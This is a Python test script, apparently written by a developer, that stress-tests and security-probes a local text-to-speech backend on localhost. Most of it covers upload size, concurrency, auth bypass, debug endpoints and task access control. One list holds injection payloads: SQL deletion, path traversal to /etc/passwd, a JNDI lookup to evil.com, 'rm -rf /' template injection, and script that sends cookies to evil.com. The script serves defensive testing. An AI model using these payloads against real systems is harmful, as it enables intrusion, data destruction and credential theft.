#!/usr/bin/env python3
"""
高级打脸测试 - 深度挖掘版
专门针对边界条件、性能问题和业务逻辑漏洞
"""

import requests
import json
import time
import threading
import random
from datetime import datetime

class AdvancedFaceSlappingTester:
    def __init__(self, base_url="http://localhost:9930"):
        self.base_url = base_url
        self.session = requests.Session()
        self.problems = []
    
    def log_issue(self, category, issue, evidence):
        self.problems.append({
            "category": category,
            "issue": issue,
            "evidence": evidence,
            "timestamp": datetime.now().isoformat()
        })
        print(f"🚨 {category}: {issue}")
        print(f"   证据: {evidence}\n")
    
    def test_boundary_conditions(self):
        """测试边界条件"""
        print("🔍 === 边界条件深度测试 ===")
        
        # 1. 超大文件上传测试
        try:
            # 模拟大文件
            large_data = "A" * (50 * 1024 * 1024)  # 50MB
            files = {'audio': ('test.wav', large_data, 'audio/wav')}
            
            response = self.session.post(
                f"{self.base_url}/api/voices/upload",
                files=files,
                timeout=60
            )
            
            if response.status_code == 200:
                self.log_issue(
                    "性能问题",
                    "接受超大文件上传",
                    f"50MB文件被接受，可能导致服务器资源耗尽"
                )
        except Exception as e:
            if "timeout" in str(e).lower():
                self.log_issue(
                    "性能问题",
                    "大文件上传导致超时",
                    f"50MB文件上传超时: {e}"
                )
        
        # 2. 极长文本TTS测试
        extreme_text = "测试" * 50000  # 20万字符
        try:
            response = self.session.post(
                f"{self.base_url}/api/tts/synthesize",
                json={"text": extreme_text, "voice_id": "test"},
                timeout=30
            )
            
            if response.status_code == 200:
                self.log_issue(
                    "业务逻辑",
                    "处理极长文本没有限制",
                    f"处理了{len(extreme_text)}字符的文本"
                )
        except:
            pass
        
        # 3. 特殊字符注入测试
        special_chars = [
            "'; DELETE FROM users; --",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "<%- system('rm -rf /') %>",
            "{{7*7}}",
            "<script>fetch('http://evil.com/steal?data='+document.cookie)</script>"
        ]
        
        for payload in special_chars:
            try:
                response = self.session.post(
                    f"{self.base_url}/api/characters/",
                    json={"name": payload, "display_name": "test"}
                )
                
                if response.status_code == 200 or payload in response.text:
                    self.log_issue(
                        "安全漏洞",
                        f"特殊字符未过滤: {payload[:30]}...",
                        f"状态码: {response.status_code}"
                    )
            except:
                pass
    
    def test_concurrent_stress(self):
        """并发压力测试"""
        print("⚡ === 并发压力测试 ===")
        
        def make_request(endpoint, data=None):
            try:
                if data:
                    return self.session.post(f"{self.base_url}{endpoint}", json=data)
                else:
                    return self.session.get(f"{self.base_url}{endpoint}")
            except:
                return None
        
        # 1. 高并发TTS请求
        threads = []
        results = []
        
        def tts_worker():
            result = make_request("/api/tts/synthesize", {
                "text": "并发测试文本",
                "voice_id": "test"
            })
            results.append(result)
        
        start_time = time.time()
        for _ in range(50):  # 50个并发请求
            thread = threading.Thread(target=tts_worker)
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
        
        end_time = time.time()
        
        success_count = sum(1 for r in results if r and r.status_code == 200)
        error_count = sum(1 for r in results if r and r.status_code >= 500)
        
        if error_count > 10:
            self.log_issue(
                "并发处理",
                "高并发下大量500错误",
                f"50个请求中{error_count}个返回500错误"
            )
        
        if success_count < 25:
            self.log_issue(
                "性能问题",
                "并发处理能力不足",
                f"50个并发请求只有{success_count}个成功"
            )
        
        # 2. 数据库连接池测试
        def db_worker():
            endpoints = ["/api/engines/", "/api/voices/", "/api/characters/"]
            for endpoint in endpoints:
                make_request(endpoint)
        
        threads = []
        for _ in range(20):  # 20个并发数据库查询
            thread = threading.Thread(target=db_worker)
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
    
    def test_memory_leaks(self):
        """内存泄漏测试"""
        print("🧠 === 内存泄漏测试 ===")
        
        # 连续大量请求测试
        start_time = time.time()
        for i in range(1000):
            try:
                # 创建大量小对象
                self.session.get(f"{self.base_url}/health")
                if i % 100 == 0:
                    print(f"   完成 {i} 个请求...")
            except:
                break
        
        end_time = time.time()
        print(f"   1000个请求耗时: {end_time - start_time:.2f}秒")
        
        # 如果后期请求明显变慢，可能存在内存泄漏
        if end_time - start_time > 30:  # 超过30秒
            self.log_issue(
                "性能问题",
                "可能存在内存泄漏",
                f"1000个简单请求耗时{end_time - start_time:.2f}秒"
            )
    
    def test_authentication_bypass(self):
        """认证绕过测试"""
        print("🔐 === 认证安全测试 ===")
        
        # 尝试访问应该需要认证的端点
        protected_endpoints = [
            "/api/engines/",
            "/api/voices/upload",
            "/api/system/settings"
        ]
        
        for endpoint in protected_endpoints:
            try:
                response = self.session.get(f"{self.base_url}{endpoint}")
                if response.status_code == 200:
                    self.log_issue(
                        "安全漏洞",
                        f"无需认证即可访问: {endpoint}",
                        f"状态码: {response.status_code}"
                    )
            except:
                pass
        
        # 尝试JWT绕过
        headers_tests = [
            {"Authorization": "Bearer invalid_token"},
            {"Authorization": "Bearer "},
            {"Authorization": "Basic YWRtaW46YWRtaW4="},  # admin:admin
            {"X-API-Key": "test"},
            {"X-Auth-Token": "bypass"}
        ]
        
        for headers in headers_tests:
            try:
                response = self.session.get(
                    f"{self.base_url}/api/system/settings",
                    headers=headers
                )
                if response.status_code == 200:
                    self.log_issue(
                        "安全漏洞",
                        f"认证绕过成功",
                        f"使用头部: {headers}"
                    )
            except:
                pass
    
    def test_data_exposure(self):
        """数据泄露测试"""
        print("📊 === 数据泄露测试 ===")
        
        # 检查错误信息是否泄露敏感信息
        try:
            response = self.session.get(f"{self.base_url}/api/engines/invalid_id")
            error_text = response.text.lower()
            
            sensitive_keywords = [
                "password", "secret", "key", "token", "database",
                "connection", "config", "env", "localhost", "127.0.0.1"
            ]
            
            for keyword in sensitive_keywords:
                if keyword in error_text:
                    self.log_issue(
                        "信息泄露",
                        f"错误信息泄露敏感词: {keyword}",
                        f"响应: {response.text[:200]}"
                    )
        except:
            pass
        
        # 检查调试信息泄露
        debug_endpoints = [
            "/debug", "/api/debug", "/admin", "/test",
            "/.env", "/config", "/api/config"
        ]
        
        for endpoint in debug_endpoints:
            try:
                response = self.session.get(f"{self.base_url}{endpoint}")
                if response.status_code == 200 and len(response.text) > 50:
                    self.log_issue(
                        "信息泄露",
                        f"可访问调试端点: {endpoint}",
                        f"状态码: {response.status_code}, 长度: {len(response.text)}"
                    )
            except:
                pass
    
    def test_business_logic_flaws(self):
        """业务逻辑缺陷测试"""
        print("🎯 === 业务逻辑缺陷测试 ===")
        
        # 1. 测试异步任务是否可以被其他用户访问
        try:
            # 创建任务
            response = self.session.post(
                f"{self.base_url}/api/tts/synthesize-async",
                json={"text": "测试任务", "voice_id": "test"}
            )
            
            if response.status_code == 200:
                task_data = response.json()
                task_id = task_data.get('task_id')
                
                if task_id:
                    # 尝试用不同的session访问
                    new_session = requests.Session()
                    task_response = new_session.get(
                        f"{self.base_url}/api/tts/tasks/{task_id}"
                    )
                    
                    if task_response.status_code == 200:
                        self.log_issue(
                            "业务逻辑",
                            "任务可被任意用户访问",
                            f"任务ID {task_id} 无权限控制"
                        )
        except:
            pass
        
        # 2. 测试资源ID猜测
        common_ids = ["1", "test", "admin", "default", "system"]
        for test_id in common_ids:
            try:
                response = self.session.get(f"{self.base_url}/api/engines/{test_id}")
                if response.status_code == 200:
                    self.log_issue(
                        "业务逻辑",
                        f"可猜测的资源ID: {test_id}",
                        f"引擎ID {test_id} 可直接访问"
                    )
            except:
                pass
    
    def run_advanced_tests(self):
        """运行所有高级测试"""
        print("🥊 === 高级打脸测试 - 深度挖掘版 ===")
        print(f"⏰ 开始时间: {datetime.now().strftime('%H:%M:%S')}")
        print("=" * 50)
        
        self.test_boundary_conditions()
        self.test_concurrent_stress()
        self.test_memory_leaks()
        self.test_authentication_bypass()
        self.test_data_exposure()
        self.test_business_logic_flaws()
        
        # 生成报告
        print("=" * 50)
        print("📋 === 高级测试结果报告 ===")
        
        if not self.problems:
            print("🤔 意外！没有发现新的问题...")
            print("   后端工程师可能真的很厉害")
        else:
            print(f"🎯 发现了 {len(self.problems)} 个深层问题！")
            
            categories = {}
            for problem in self.problems:
                cat = problem['category']
                categories[cat] = categories.get(cat, 0) + 1
            
            print("\n📊 问题分类:")
            for cat, count in categories.items():
                print(f"   • {cat}: {count} 个")
            
            print("\n🔍 详细问题:")
            for i, problem in enumerate(self.problems, 1):
                print(f"{i}. {problem['issue']}")
                print(f"   分类: {problem['category']}")
                print(f"   证据: {problem['evidence']}")
                print()
        
        print("🏁 高级测试完成！")


if __name__ == "__main__":
    tester = AdvancedFaceSlappingTester()
    tester.run_advanced_tests() 